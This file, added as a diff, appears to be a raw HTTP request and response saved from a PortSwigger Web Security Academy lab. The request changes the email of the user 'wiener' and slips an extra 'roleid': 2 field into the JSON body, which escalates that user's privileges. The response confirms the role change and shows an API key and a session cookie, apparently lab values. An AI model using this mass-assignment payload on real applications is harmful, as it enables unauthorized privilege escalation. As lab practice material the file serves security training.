@@ -1,0 +1,30 @@
+POST https://0a030080047f054c80d9a30e008d007d.web-security-academy.net/my-account/change-email HTTP/1.1
+host: 0a030080047f054c80d9a30e008d007d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: text/plain;charset=UTF-8
+content-length: 53
+Origin: https://0a030080047f054c80d9a30e008d007d.web-security-academy.net
+Connection: keep-alive
+Referer: https://0a030080047f054c80d9a30e008d007d.web-security-academy.net/my-account?id=wiener
+Cookie: session=EV7EEFkwy7rSRziPeXhNNKcO3HRPa5hp
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+
+{"email":"myneweremail@superadmin.net", 
+"roleid": 2}HTTP/1.1 302 Found
+Location: /my-account
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 131
+
+{
+  "username": "wiener",
+  "email": "myneweremail@superadmin.net",
+  "apikey": "DmkxNF1RJb1uxpr2kbmGfEYW6ysn9zAr",
+  "roleid": 2
+}
